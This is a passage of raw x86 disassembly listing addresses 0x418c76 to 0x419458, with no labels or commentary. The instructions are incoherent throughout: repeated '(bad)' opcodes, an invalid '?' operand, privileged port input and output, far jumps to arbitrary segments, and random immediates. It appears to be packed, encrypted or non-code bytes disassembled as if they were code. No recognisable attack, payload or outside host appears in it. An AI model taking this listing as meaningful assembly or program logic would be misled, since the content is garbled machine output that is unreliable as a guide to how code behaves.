  418c76:	cmp    BYTE PTR [esi+0x10],0xaa
  418c7a:	lea    edi,[ebx+0x77]
  418c7d:	add    eax,0xffcc7b6f
  418c82:	repnz xor ah,dh
  418c85:	je     0x418c41
  418c87:	scas   eax,DWORD PTR es:[edi]
  418c88:	xchg   edx,eax
  418c89:	cmc    
  418c8a:	xor    al,0xa8
  418c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8d:	add    eax,eax
  418c8f:	sub    eax,0x8af4e0ff
  418c94:	shl    DWORD PTR [esi],1
  418c96:	ds mov dh,0x79
  418c99:	jl     0x418cdf
  418c9b:	ret    0x2868
  418c9e:	and    DWORD PTR [edi-0x19bbf87],0xa0cefa08
  418ca8:	sub    BYTE PTR ds:0xc6cff3c2,cl
  418cae:	jge    0x418d10
  418cb0:	push   ecx
  418cb1:	xchg   ecx,eax
  418cb2:	mov    dh,0x1e
  418cb4:	ss pop ebp
  418cb6:	(bad)  
  418cb7:	mov    ecx,0xa9c333dc
  418cbc:	xor    bh,bl
  418cbe:	push   cs
  418cbf:	mov    bh,0xfe
  418cc1:	shr    DWORD PTR [esi+0x43fbd323],cl
  418cc7:	or     DWORD PTR [ebx],edi
  418cc9:	jge    0x418d11
  418ccb:	mov    ebx,ss
  418ccd:	mov    ah,0x36
  418ccf:	jb     0x418cb6
  418cd1:	rcr    ebx,1
  418cd3:	(bad)  
  418cd5:	fisub  WORD PTR [edx+ebx*4+0x71ad9102]
  418cdc:	lea    edx,[ebx+0x1ad09234]
  418ce2:	pop    ebx
  418ce3:	jle    0x418d1e
  418ce5:	push   esi
  418ce6:	pop    ds
  418ce7:	mov    ds:0xe9b385f5,eax
  418cec:	std    
  418ced:	and    esi,DWORD PTR [esi-0x7061214a]
  418cf3:	leave  
  418cf4:	test   BYTE PTR [ebx*1+0x735c1e40],al
  418cfb:	das    
  418cfc:	or     BYTE PTR [ebx],bl
  418cfe:	jb     0x418d44
  418d00:	sbb    cl,al
  418d02:	shr    BYTE PTR [esp+esi*2+0x7395c76],1
  418d09:	push   cs
  418d0a:	xchg   esi,eax
  418d0b:	cwde   
  418d0c:	dec    edi
  418d0d:	xor    edi,DWORD PTR [esi*1+0x37fcb13b]
  418d14:	rcr    BYTE PTR [edx+0x2dfb94db],1
  418d1a:	mov    ah,0x89
  418d1c:	mov    ah,0x74
  418d1e:	lea    ebp,[edx+0x58d9c8ad]
  418d24:	pop    ebx
  418d25:	cdq    
  418d26:	dec    esi
  418d27:	mov    eax,ds:0x6531e59a
  418d2c:	test   eax,0x215d9ff
  418d31:	jo     0x418d92
  418d33:	jmp    0xe7a7:0x6e185d84
  418d3a:	adc    al,0xc6
  418d3c:	xchg   BYTE PTR [eax],bl
  418d3e:	cmp    ebx,edx
  418d40:	push   es
  418d41:	sub    esi,esp
  418d43:	jb     0x418d88
  418d45:	jae    0x418d3d
  418d47:	xor    eax,0xe664c9b0
  418d4c:	icebp  
  418d4d:	leave  
  418d4e:	push   edx
  418d4f:	dec    esp
  418d50:	mov    dl,0xb2
  418d52:	xchg   esp,ebp
  418d54:	xlat   BYTE PTR ds:[ebx]
  418d55:	arpl   WORD PTR [esi-0x4e986e28],si
  418d5b:	sbb    BYTE PTR [esi-0x80],0xed
  418d5f:	repz inc edi
  418d61:	pushf  
  418d62:	mov    DWORD PTR [edx+0x32],esp
  418d65:	jge    0x72506278
  418d6b:	in     eax,0xbb
  418d6d:	jecxz  0x418d3a
  418d6f:	lea    ebx,[eax+0x66]
  418d72:	mov    al,ds:0x494cb006
  418d77:	cld    
  418d78:	retf   
  418d79:	pusha  
  418d7a:	pop    esi
  418d7b:	xor    BYTE PTR [edx],cl
  418d7d:	push   ebx
  418d7e:	test   BYTE PTR [eax+0x7b40481a],ch
  418d84:	and    ecx,DWORD PTR [eax+0xc]
  418d87:	pop    ss
  418d88:	inc    esp
  418d89:	jb     0x418d7d
  418d8b:	leave  
  418d8c:	lods   al,BYTE PTR ds:[esi]
  418d8d:	pop    ss
  418d8e:	adc    BYTE PTR [edx],cl
  418d90:	inc    ecx
  418d91:	cmp    eax,0xe6077f94
  418d96:	(bad)  
  418d97:	fdivr  QWORD PTR [ebx+0x1dc0af0d]
  418d9d:	nop
  418d9e:	dec    ebp
  418d9f:	mov    bl,0xbd
  418da1:	in     eax,0x7c
  418da3:	cmp    al,BYTE PTR [ebx+0x58b6a228]
  418da9:	jbe    0x418d7c
  418dab:	add    edi,DWORD PTR [esi-0x1e]
  418dae:	pop    es
  418daf:	aas    
  418db0:	pop    esp
  418db1:	pop    esp
  418db2:	fisubr DWORD PTR [esi+edi*8+0x25b9d7f8]
  418db9:	add    cl,bl
  418dbb:	ja     0x418e2b
  418dbd:	cmp    dl,BYTE PTR [edi]
  418dbf:	xor    eax,esp
  418dc1:	faddp  st(0),st
  418dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc4:	clc    
  418dc5:	dec    eax
  418dc6:	jg     0x418d62
  418dc8:	mov    cl,0x14
  418dca:	and    ah,BYTE PTR [eax]
  418dcc:	mov    ebx,0x2d119d92
  418dd1:	fnstcw WORD PTR [esi-0x3ca66258]
  418dd7:	jg     0x418daf
  418dd9:	(bad)  
  418dda:	mov    ebx,0x406ef794
  418ddf:	aaa    
  418de0:	icebp  
  418de1:	ins    DWORD PTR es:[edi],dx
  418de2:	push   DWORD PTR [esi+ecx*1]
  418de5:	leave  
  418de6:	xor    ah,BYTE PTR [ebx+0xa9008c4]
  418dec:	sbb    eax,0x4de16eb5
  418df1:	in     eax,0xa1
  418df3:	shl    DWORD PTR [edi+0x7dd7cc84],1
  418df9:	xchg   ebx,eax
  418dfa:	push   cs
  418dfb:	dec    edx
  418dfc:	xor    esi,DWORD PTR [ecx-0x5f7c9f7b]
  418e02:	fiadd  DWORD PTR [ecx]
  418e04:	int3   
  418e05:	test   edi,esp
  418e07:	jge    0x418d9e
  418e09:	sbb    al,0xcb
  418e0b:	dec    DWORD PTR [ecx]
  418e0d:	fdiv   QWORD PTR [ebp+0x67825ae2]
  418e13:	xor    eax,0x9f92ce01
  418e18:	aas    
  418e19:	fiadd  DWORD PTR [esi]
  418e1b:	rcl    BYTE PTR [esi],1
  418e1d:	push   ecx
  418e1e:	xchg   esi,eax
  418e1f:	shr    DWORD PTR [edx+0x229f0bc4],1
  418e25:	mov    dh,BYTE PTR [ebx+0x584d957]
  418e2b:	pop    es
  418e2c:	dec    ebx
  418e2d:	push   edi
  418e2e:	sbb    al,0x34
  418e30:	mov    eax,ds:0x31f7bc3c
  418e35:	imul   ebp,DWORD PTR [esi],0xde5fb6fe
  418e3b:	inc    edx
  418e3c:	mov    al,ds:0xe0de0224
  418e41:	xchg   DWORD PTR [eax+0x27],esi
  418e44:	mov    dl,0x6c
  418e46:	jge    0x418eb6
  418e48:	repnz sub dl,cl
  418e4b:	sbb    al,0x36
  418e4d:	jae    0x418e4d
  418e4f:	dec    esp
  418e50:	pop    es
  418e51:	mov    ebp,0x94d107c1
  418e56:	test   DWORD PTR [edx-0x59],esp
  418e59:	outs   dx,BYTE PTR ds:[esi]
  418e5a:	mov    dl,BYTE PTR [ecx-0x7e]
  418e5d:	dec    ecx
  418e5e:	push   ecx
  418e5f:	push   0x89e35c83
  418e64:	adc    BYTE PTR [edx-0x5f554d65],ch
  418e6a:	dec    ebp
  418e6b:	in     eax,0x5a
  418e6d:	or     eax,edi
  418e6f:	or     ch,ah
  418e71:	cld    
  418e72:	popa   
  418e73:	pop    eax
  418e74:	test   al,0x4b
  418e76:	cmp    eax,0xd13cd31e
  418e7b:	add    edx,esi
  418e7d:	dec    ebp
  418e7e:	xchg   BYTE PTR [esi],ah
  418e80:	test   al,0xcc
  418e82:	fild   WORD PTR [eax+0x7b]
  418e85:	mov    dl,0xe2
  418e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e88:	sub    ebp,DWORD PTR [edi-0x5a93d5a4]
  418e8e:	(bad)  
  418e8f:	lock out dx,al
  418e91:	out    dx,eax
  418e92:	test   BYTE PTR [ebp+0x71134017],al
  418e98:	outs   dx,BYTE PTR ds:[esi]
  418e99:	xchg   edx,eax
  418e9a:	sbb    DWORD PTR [edx],ebx
  418e9c:	in     eax,0xb7
  418e9e:	and    BYTE PTR [eax-0x57e9465f],0x8b
  418ea5:	call   0x13b1:0x1b0af184
  418eac:	ja     0x418ef6
  418eae:	mov    al,ds:0xd5e872b9
  418eb3:	je     0x418eaf
  418eb5:	push   0xffffffe7
  418eb7:	jge    0x418eed
  418eb9:	js     0x418e90
  418ebb:	rcr    edi,0xeb
  418ebe:	pop    edx
  418ebf:	mov    edi,0x18e9f7c3
  418ec4:	xchg   edx,eax
  418ec5:	push   eax
  418ec6:	xchg   esp,eax
  418ec7:	push   ecx
  418ec8:	cmc    
  418ec9:	inc    ebx
  418eca:	jae    0x418eb5
  418ecc:	push   es
  418ecd:	sahf   
  418ece:	pushf  
  418ecf:	jl     0x418ee3
  418ed1:	inc    edi
  418ed2:	fcom   DWORD PTR [esi-0x45]
  418ed5:	scas   eax,DWORD PTR es:[edi]
  418ed6:	xor    cl,dl
  418ed8:	sbb    eax,0x156baa10
  418edd:	imul   DWORD PTR [ebx-0x6d]
  418ee0:	jns    0x418ecd
  418ee2:	and    BYTE PTR [edx],dh
  418ee4:	sti    
  418ee5:	xor    BYTE PTR [edi+0x1f],dl
  418ee8:	jp     0x418ef7
  418eea:	xchg   ebp,eax
  418eeb:	cmp    eax,0x4b2728b2
  418ef0:	xor    DWORD PTR [ecx*1-0x761925c9],eax
  418ef7:	fwait
  418ef8:	sar    BYTE PTR [ecx+edx*2-0x2f],cl
  418efc:	pop    edx
  418efd:	push   edi
  418efe:	push   ebx
  418eff:	mov    al,ds:0x856c1fe0
  418f04:	pop    ecx
  418f05:	(bad)  
  418f06:	ins    BYTE PTR es:[edi],dx
  418f07:	mov    edx,DWORD PTR [esi-0x2a2c207c]
  418f0d:	sar    DWORD PTR es:[ebp-0x5b5858a9],cl
  418f14:	rcr    BYTE PTR [ebx+0x60],0xf5
  418f18:	sub    BYTE PTR [edx],bl
  418f1a:	mov    al,0x6
  418f1c:	sub    edx,DWORD PTR [ebp+0x42]
  418f1f:	xor    edx,DWORD PTR [ebp+0x16]
  418f22:	mov    eax,ds:0xdb974a11
  418f27:	out    0x2e,al
  418f29:	jge    0x418f93
  418f2b:	cmp    DWORD PTR [edx+0x6f05097b],edi
  418f31:	adc    esp,DWORD PTR [esi-0x46]
  418f34:	inc    edi
  418f35:	or     BYTE PTR [edx+0x51],dh
  418f38:	sbb    dl,bh
  418f3a:	int3   
  418f3b:	mov    eax,ds:0x3fbc487e
  418f40:	les    ecx,FWORD PTR [ebx-0x50]
  418f43:	xchg   BYTE PTR [esi],al
  418f45:	stos   DWORD PTR es:[edi],eax
  418f46:	sub    al,0x7e
  418f48:	pop    ebp
  418f49:	and    al,BYTE PTR [edx+0x31bd4565]
  418f4f:	adc    ch,BYTE PTR [ecx+0x45]
  418f52:	mov    al,ds:0x7b3b355a
  418f57:	inc    edx
  418f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f59:	pop    edi
  418f5a:	call   0x74ca:0xe4f36079
  418f61:	sar    DWORD PTR [eax],0xd5
  418f64:	sbb    al,0xbb
  418f66:	adc    ecx,DWORD PTR [eax+ebp*8-0x57a6dfb]
  418f6d:	adc    DWORD PTR [esi-0x4aa41ac1],0xffffffba
  418f74:	out    0x6e,al
  418f76:	out    dx,eax
  418f77:	pop    esp
  418f78:	xor    BYTE PTR [ebx+0x49c01736],ch
  418f7e:	lods   al,BYTE PTR ds:[esi]
  418f7f:	stos   BYTE PTR es:[edi],al
  418f80:	mov    eax,0x2ee653b0
  418f85:	test   eax,0xe6f94f8f
  418f8a:	mov    edi,0xf9bf4eda
  418f8f:	pop    es
  418f90:	dec    eax
  418f91:	or     al,0x6d
  418f93:	out    dx,al
  418f94:	cmp    al,0x2
  418f96:	fs cs aad 0xc3
  418f9a:	sbb    DWORD PTR fs:[esi+eax*8],edi
  418f9e:	not    DWORD PTR [edi-0x15]
  418fa1:	out    0x44,al
  418fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fa4:	pop    ebx
  418fa5:	xor    DWORD PTR [edx-0x46],ebp
  418fa8:	ss jp  0x418f5e
  418fab:	adc    al,0x20
  418fad:	pop    ss
  418fae:	xor    al,bl
  418fb0:	ret    
  418fb1:	xor    cl,BYTE PTR [edx+0x681a3c43]
  418fb7:	add    DWORD PTR [ebp+eax*1+0x5a],0xeb6aeb0a
  418fbf:	in     eax,0x43
  418fc1:	add    DWORD PTR [ebx+0x7a],esp
  418fc4:	and    DWORD PTR [edx+0x62],esi
  418fc7:	or     BYTE PTR [ebx+0x6f],al
  418fca:	pushf  
  418fcb:	push   cs
  418fcc:	mov    bl,0x84
  418fce:	hlt    
  418fcf:	mov    esi,0x361c7397
  418fd4:	sub    edi,ebx
  418fd6:	aaa    
  418fd7:	cwde   
  418fd8:	sbb    bh,dh
  418fda:	scas   eax,DWORD PTR es:[edi]
  418fdb:	jge    0x419007
  418fdd:	dec    ecx
  418fde:	xchg   ebx,edx
  418fe0:	jnp    0x418f87
  418fe2:	jle    0x419043
  418fe4:	ss push ebp
  418fe6:	or     eax,0xbc2f2b76
  418feb:	int    0xa6
  418fed:	adc    al,0x7
  418fef:	mov    edi,0xa7b2a0b0
  418ff4:	jns    0x418fab
  418ff6:	push   ecx
  418ff7:	fcom   QWORD PTR [ebx]
  418ff9:	int3   
  418ffa:	test   al,ch
  418ffc:	mov    ebx,0xaaac3c12
  419001:	rcl    DWORD PTR [ebp-0x15],cl
  419004:	aas    
  419005:	retf   0xb064
  419008:	mov    ch,BYTE PTR [ebx+edx*8]
  41900b:	mov    dh,0xcc
  41900d:	(bad)  
  41900e:	mov    ecx,0xaf4940c0
  419013:	pop    ss
  419014:	mov    al,ds:0x9b915245
  419019:	push   ecx
  41901a:	fisub  DWORD PTR [edx+0x334e66af]
  419020:	rol    DWORD PTR [esp+esi*4+0x699d7f47],cl
  419027:	mov    al,al
  419029:	dec    ebx
  41902a:	xchg   edi,ebp
  41902c:	(bad)  
  41902d:	std    
  41902e:	pop    ebp
  41902f:	popf   
  419030:	es rcl bh,1
  419033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419034:	xchg   edi,eax
  419035:	jmp    DWORD PTR [ecx+0x1f]
  419038:	jb     0x419071
  41903a:	enter  0x75b5,0x59
  41903e:	push   cs
  41903f:	shl    BYTE PTR [edx+0x6166549d],1
  419045:	test   esp,esp
  419047:	addr16 out dx,al
  419049:	push   es
  41904a:	scas   al,BYTE PTR es:[edi]
  41904b:	stc    
  41904c:	pop    edi
  41904d:	ins    BYTE PTR es:[edi],dx
  41904e:	push   ebx
  41904f:	xchg   esi,eax
  419050:	scas   al,BYTE PTR es:[di]
  419052:	fcomp  QWORD PTR [ecx-0x3f]
  419055:	es mov edx,0xb3b68f51
  41905b:	outs   dx,DWORD PTR ds:[esi]
  41905c:	ret    0xeb28
  41905f:	out    dx,eax
  419060:	loope  0x418ffc
  419062:	das    
  419063:	jmp    0x520f6e94
  419068:	cmp    esi,DWORD PTR [edi]
  41906a:	xor    bl,BYTE PTR [ecx-0x7d]
  41906d:	mov    bh,ah
  41906f:	xchg   esp,eax
  419070:	and    ecx,DWORD PTR [ebx+0x77c6d557]
  419076:	aaa    
  419077:	mov    ?,WORD PTR [esi-0x7d]
  41907a:	sub    eax,0xe8263e53
  41907f:	inc    esp
  419080:	pop    eax
  419081:	xor    ecx,eax
  419083:	xchg   DWORD PTR [edx-0x284c224f],eax
  419089:	imul   edi,DWORD PTR ds:0x8f4c,0x5
  41908f:	shl    BYTE PTR [ebp-0x67463973],1
  419095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419096:	aas    
  419097:	sbb    eax,0xd3a64b90
  41909c:	leave  
  41909d:	push   edx
  41909e:	sub    BYTE PTR [edx-0x75],dh
  4190a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190a2:	mov    edi,0xd7997e9d
  4190a7:	xor    esi,0x9079069a
  4190ad:	aaa    
  4190ae:	scas   al,BYTE PTR es:[edi]
  4190af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b0:	div    DWORD PTR [ebp+0x1]
  4190b3:	nop
  4190b4:	inc    eax
  4190b5:	mov    eax,ds:0xc4c7079c
  4190ba:	ror    ebx,0xe5
  4190bd:	iret   
  4190be:	adc    bl,BYTE PTR [edx-0x6f]
  4190c1:	(bad)  
  4190c2:	sub    eax,0x784d4874
  4190c7:	or     ecx,DWORD PTR [ecx]
  4190c9:	xor    al,0x12
  4190cb:	stc    
  4190cc:	(bad)  
  4190cd:	adc    al,0xfa
  4190cf:	jmp    0x340c24ca
  4190d4:	add    eax,0xa15ba3e8
  4190d9:	dec    edi
  4190da:	mov    DWORD PTR [ebp+0x6a867aa1],ebx
  4190e0:	dec    ebx
  4190e1:	xchg   edx,eax
  4190e2:	or     eax,0x7f9c8a25
  4190e7:	jns    0x41909f
  4190e9:	jmp    0x7eee3db7
  4190ee:	sbb    eax,0xccc5eb73
  4190f3:	mov    esp,0x27f89718
  4190f8:	ret    
  4190f9:	ss out 0x8,al
  4190fc:	aad    0x1
  4190fe:	popf   
  4190ff:	inc    eax
  419100:	jnp    0x4190ff
  419102:	xchg   esi,eax
  419103:	adc    DWORD PTR [ebx+0x1b],eax
  419106:	jns    0x419146
  419108:	jp     0x4190d6
  41910a:	pop    ss
  41910b:	and    esi,DWORD PTR [edi]
  41910d:	add    DWORD PTR [eax+ebx*4+0x51095e85],edi
  419114:	jo     0x41916c
  419116:	mov    ebp,0xa1547aab
  41911b:	and    al,0x96
  41911d:	lahf   
  41911e:	ds in  al,0x30
  419121:	(bad)  [edi]
  419123:	cdq    
  419124:	push   0xf95ad92d
  419129:	popf   
  41912a:	aam    0x1a
  41912c:	adc    BYTE PTR [ebx],dl
  41912e:	sub    edi,edx
  419130:	pop    ecx
  419131:	xor    eax,0x28723eae
  419136:	or     eax,0xe3b95951
  41913b:	push   ecx
  41913c:	aam    0x43
  41913e:	push   edx
  41913f:	mov    dl,0x9f
  419141:	xor    BYTE PTR [edx],0x4c
  419144:	xchg   BYTE PTR [eax-0x235a6b31],bh
  41914a:	pop    esp
  41914b:	(bad)  
  41914c:	jecxz  0x4190f1
  41914e:	mov    ds,WORD PTR [edi]
  419150:	add    DWORD PTR [eax+esi*8],esi
  419153:	jp     0x41917a
  419155:	xchg   ebx,eax
  419156:	les    edi,FWORD PTR [ecx-0x1c]
  419159:	cmc    
  41915a:	push   edx
  41915b:	sub    al,ch
  41915d:	das    
  41915e:	lahf   
  41915f:	imul   ebx,DWORD PTR [ecx],0xffffffc4
  419162:	fst    QWORD PTR [esi+0x48]
  419165:	mov    eax,ds:0x833077cb
  41916a:	push   ss
  41916b:	arpl   WORD PTR [esi+0x31],si
  41916e:	ss gs sbb ch,bl
  419172:	mov    BYTE PTR [ebx],ch
  419174:	mov    gs,WORD PTR [ebp+0x46de35a1]
  41917a:	jnp    0x41918b
  41917c:	rcl    BYTE PTR [eax],1
  41917e:	std    
  41917f:	sbb    edx,DWORD PTR [edi-0x45d8debb]
  419185:	int    0x4a
  419187:	jmp    0x7222:0x9b4be2b4
  41918e:	retf   
  41918f:	sub    DWORD PTR [edi+0x79],ebx
  419192:	call   0x69:0xeadcf387
  419199:	sbb    eax,0x90ffa72d
  41919e:	dec    ebx
  41919f:	adc    al,0x50
  4191a1:	push   ss
  4191a2:	out    dx,eax
  4191a3:	sar    DWORD PTR [edi+0x15a2062f],0x94
  4191aa:	xor    eax,0x2d899762
  4191af:	fdiv   QWORD PTR [ecx]
  4191b1:	mov    al,0x13
  4191b3:	inc    eax
  4191b5:	mov    WORD PTR [esi+0x1e],fs
  4191b8:	scas   eax,DWORD PTR es:[edi]
  4191b9:	aam    0xcf
  4191bb:	enter  0xfc0e,0xe4
  4191bf:	pop    edi
  4191c0:	out    dx,eax
  4191c1:	fistp  QWORD PTR [eax]
  4191c3:	aam    0x9e
  4191c5:	pusha  
  4191c6:	jmp    0x37bf:0x14d6cd60
  4191cd:	mov    eax,ds:0xf26f566
  4191d2:	pop    esi
  4191d3:	xchg   ebx,eax
  4191d4:	test   ebp,0xa93e2fe3
  4191da:	popa   
  4191db:	push   ss
  4191dc:	sbb    bl,cl
  4191de:	int3   
  4191df:	(bad)  
  4191e1:	mov    ds:0xf99a397b,al
  4191e6:	out    dx,al
  4191e7:	lds    edi,FWORD PTR [ebx+0x29]
  4191ea:	push   0xba2398a2
  4191ef:	fcmovb st,st(5)
  4191f1:	xchg   BYTE PTR [ebx],al
  4191f3:	mov    edi,0xfbdd664e
  4191f8:	fdivr  QWORD PTR [esi+0x3b]
  4191fb:	in     eax,dx
  4191fc:	dec    esp
  4191fd:	and    ch,BYTE PTR [esi]
  4191ff:	fwait
  419200:	dec    ecx
  419201:	outs   dx,BYTE PTR ds:[esi]
  419202:	repnz (bad) 
  419204:	popa   
  419205:	stos   BYTE PTR es:[edi],al
  419206:	xchg   ebx,eax
  419207:	and    al,0x43
  419209:	imul   edi,edx,0x48
  41920c:	push   edx
  41920d:	pop    ebx
  41920e:	in     eax,dx
  41920f:	inc    ebx
  419210:	in     eax,dx
  419211:	hlt    
  419212:	jg     0x419204
  419214:	jecxz  0x419235
  419216:	sub    eax,0x76af9fc3
  41921b:	dec    ebx
  41921c:	test   al,0xa3
  41921e:	cmp    DWORD PTR [eax+0x9],0xffffffaa
  419222:	mov    esi,0x1a4bc7c0
  419227:	repz xor ch,BYTE PTR [esi+ecx*1-0x4e]
  41922c:	pop    edi
  41922d:	movsx  edi,BYTE PTR [ebx-0x65]
  419231:	dec    edi
  419232:	je     0x4192a8
  419234:	lahf   
  419235:	xchg   esi,eax
  419236:	mov    ds:0xf4da6a51,al
  41923b:	pop    ss
  41923c:	mov    edi,0x2e98e2ae
  419241:	out    0xc3,eax
  419243:	mov    ds:0x7d5ac1bf,al
  419248:	jg     0x4191d8
  41924a:	mov    ebp,0x8c3ea959
  41924f:	es ret 
  419251:	mov    ch,0xcf
  419253:	and    al,BYTE PTR ds:0x8d6aee31
  419259:	mov    edx,0xc0e36422
  41925e:	adc    ebx,DWORD PTR [edi]
  419260:	jnp    0x41926e
  419262:	dec    ebx
  419263:	inc    esp
  419264:	mul    DWORD PTR [edx]
  419266:	sub    al,BYTE PTR [ebp-0x3e078e12]
  41926c:	dec    eax
  41926d:	lea    ecx,[edx]
  41926f:	pushf  
  419270:	pop    esp
  419271:	mov    ds:0xc545e82d,al
  419276:	xchg   ecx,eax
  419277:	mov    dh,0x1d
  419279:	cdq    
  41927a:	inc    ebx
  41927b:	pop    ebp
  41927c:	int3   
  41927d:	xchg   esp,eax
  41927e:	aaa    
  41927f:	test   al,0xeb
  419281:	and    eax,0x10647a87
  419286:	or     BYTE PTR [esp+esi*1],ah
  419289:	or     al,0x89
  41928b:	stos   BYTE PTR es:[edi],al
  41928c:	lods   al,BYTE PTR ds:[esi]
  41928d:	fstp   TBYTE PTR [edx-0x36ade0da]
  419293:	or     bh,BYTE PTR [esi+0x521eddcf]
  419299:	(bad)  
  41929a:	enter  0x6262,0xf0
  41929e:	aad    0x7f
  4192a0:	mov    esp,0x15ec7c98
  4192a5:	add    BYTE PTR [ebp-0x7a7fac8c],ch
  4192ab:	push   0x6e
  4192ad:	je     0x41926c
  4192af:	ins    BYTE PTR es:[edi],dx
  4192b0:	fbld   TBYTE PTR [eax+0x27]
  4192b3:	or     eax,0xae155710
  4192b8:	sub    ah,BYTE PTR ds:0x5ca3ab7
  4192be:	icebp  
  4192bf:	hlt    
  4192c0:	data16 adc dh,dl
  4192c3:	inc    esp
  4192c4:	imul   ebx,DWORD PTR [eax+0x615dff4c],0xffffffaa
  4192cb:	(bad)  
  4192cc:	xchg   ecx,eax
  4192cd:	mov    al,ds:0x603d37f3
  4192d2:	or     dl,ch
  4192d4:	fidivr WORD PTR [ebp-0x19]
  4192d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d8:	cmp    eax,0x47d41b6f
  4192dd:	loop   0x4192d0
  4192df:	lods   eax,DWORD PTR ds:[esi]
  4192e0:	dec    ebx
  4192e1:	mov    cs,WORD PTR [eax+0x58]
  4192e4:	mov    ch,0x4a
  4192e6:	ret    0x5afa
  4192e9:	shl    BYTE PTR [edi+edi*2+0x66db60a1],1
  4192f0:	dec    edx
  4192f1:	pop    DWORD PTR [ecx]
  4192f3:	and    al,0x72
  4192f5:	cmp    eax,0xd53c8397
  4192fa:	sub    bh,dl
  4192fc:	outs   dx,BYTE PTR ds:[esi]
  4192fd:	aaa    
  4192fe:	jecxz  0x4192c4
  419300:	gs call 0x37f6f108
  419306:	xlat   BYTE PTR ds:[ebx]
  419307:	sbb    al,0x11
  419309:	pop    ebx
  41930a:	jno    0x4192f3
  41930c:	and    al,0xd4
  41930e:	loop   0x419343
  419310:	push   eax
  419311:	jae    0x419362
  419313:	jae    0x419382
  419315:	jecxz  0x4192a6
  419317:	int    0xe
  419319:	or     eax,0x8cac81a8
  41931e:	fnstcw WORD PTR [eax+0x10]
  419321:	dec    bl
  419323:	sti    
  419324:	cmc    
  419325:	jp     0x4192b6
  419327:	and    esi,DWORD PTR [ebx+0xbe37a52]
  41932d:	in     eax,dx
  41932e:	pusha  
  41932f:	je     0x41930d
  419331:	pop    ds
  419332:	js     0x4192b6
  419334:	inc    eax
  419335:	jecxz  0x4192e2
  419337:	aam    0x17
  419339:	fs add eax,esi
  41933c:	paddusb mm6,QWORD PTR ds:[esi+0x70]
  419341:	add    cl,BYTE PTR [ebp+0x7275604f]
  419347:	and    eax,0x9ceb428f
  41934c:	and    ebx,DWORD PTR es:[ebx+0x109ac7c4]
  419353:	inc    eax
  419354:	jae    0x41933b
  419356:	in     al,0x41
  419358:	add    al,0xce
  41935a:	cdq    
  41935b:	pop    esp
  41935c:	push   ecx
  41935d:	aas    
  41935e:	lea    esp,[edi-0x5f]
  419361:	(bad)  
  419362:	adc    eax,0x83e55140
  419367:	outs   dx,BYTE PTR ds:[esi]
  419368:	mov    edi,0x28dedc50
  41936d:	jae    0x4193a5
  41936f:	test   al,0x3c
  419371:	retf   0xfff8
  419374:	mov    eax,ds:0xf2858ab5
  419379:	and    eax,0x233d7388
  41937e:	push   ebx
  41937f:	and    eax,ebp
  419381:	and    esp,DWORD PTR [eax]
  419383:	jl     0x4193fb
  419385:	stc    
  419386:	pop    ds
  419387:	loop   0x419312
  419389:	push   esi
  41938a:	or     DWORD PTR ds:0xe5b06ac0,eax
  419390:	push   edx
  419391:	das    
  419392:	(bad)  
  419393:	(bad)  
  419394:	xor    ebx,DWORD PTR [ecx-0x64]
  419397:	mov    ebx,0xa8edb9bf
  41939c:	xchg   ebx,eax
  41939d:	sbb    al,BYTE PTR [eax+0xfd99a04]
  4193a3:	adc    al,0x26
  4193a5:	xchg   ebx,eax
  4193a6:	in     al,dx
  4193a7:	pop    edi
  4193a8:	pop    ecx
  4193a9:	stc    
  4193aa:	fnsave [ebp+0x591a7d8b]
  4193b0:	jo     0x4193bc
  4193b2:	mov    DWORD PTR [edx],ebp
  4193b4:	shl    BYTE PTR [esi+0x79],0x6a
  4193b8:	jnp    0x4193d5
  4193ba:	mov    fs,esi
  4193bc:	xor    bh,BYTE PTR [eax-0xb259e6a]
  4193c2:	dec    ecx
  4193c3:	mov    al,BYTE PTR [eax]
  4193c5:	dec    edx
  4193c6:	push   esi
  4193c7:	jecxz  0x419440
  4193c9:	pop    ebx
  4193ca:	jae    0x419446
  4193cc:	inc    ebp
  4193cd:	popa   
  4193ce:	xor    esi,edx
  4193d0:	(bad)  
  4193d1:	mov    ds:0x443d2928,al
  4193d6:	cmp    al,0xc9
  4193d8:	pushf  
  4193d9:	lods   eax,DWORD PTR ds:[esi]
  4193da:	ja     0x41938a
  4193dc:	mov    edx,0x666654be
  4193e1:	loopne 0x41942b
  4193e3:	pop    ecx
  4193e4:	cmp    eax,0xcb072755
  4193e9:	mov    dh,0x42
  4193eb:	mov    DWORD PTR [ebx+0x7cc424f8],ecx
  4193f1:	cld    
  4193f2:	stos   BYTE PTR es:[edi],al
  4193f3:	pop    ds
  4193f4:	push   edi
  4193f5:	ja     0x419441
  4193f7:	pop    edx
  4193f8:	scas   al,BYTE PTR es:[edi]
  4193f9:	(bad)
  4193fc:	add    esi,DWORD PTR [edi+0x25ac5f80]
  419402:	adc    eax,0x648599c6
  419407:	or     eax,0xcdf90efa
  41940c:	test   DWORD PTR [ecx],ecx
  41940e:	jge    0x41944b
  419410:	lea    edx,ss:[ebx+0x72bf6689]
  419417:	lock sar esp,cl
  41941a:	jae    0x4193e8
  41941c:	jge    0x4193ed
  41941e:	cmp    DWORD PTR [ecx-0x1e],esi
  419421:	aaa    
  419422:	mov    ds:0x5de4cd63,eax
  419427:	push   eax
  419428:	fptan  
  41942a:	(bad)  
  41942b:	mov    edi,0x7cdd3f3e
  419430:	pop    ebx
  419431:	sahf   
  419432:	dec    esp
  419433:	ror    edi,1
  419435:	vorps  xmm6,xmm3,XMMWORD PTR [bx]
  41943a:	sub    eax,0x43cb5bc5
  41943f:	or     eax,0x27e05c92
  419444:	add    BYTE PTR [eax-0x32],cl
  419447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419448:	pushf  
  419449:	ins    BYTE PTR es:[edi],dx
  41944a:	(bad)  
  41944b:	pop    esi
  41944c:	mov    al,ds:0x1fd910f8
  419451:	sub    eax,0xe55f7ddc
  419456:	aam    0x9a
  419458:	rcl    BYTE PTR [ebp-0x52],0xaa
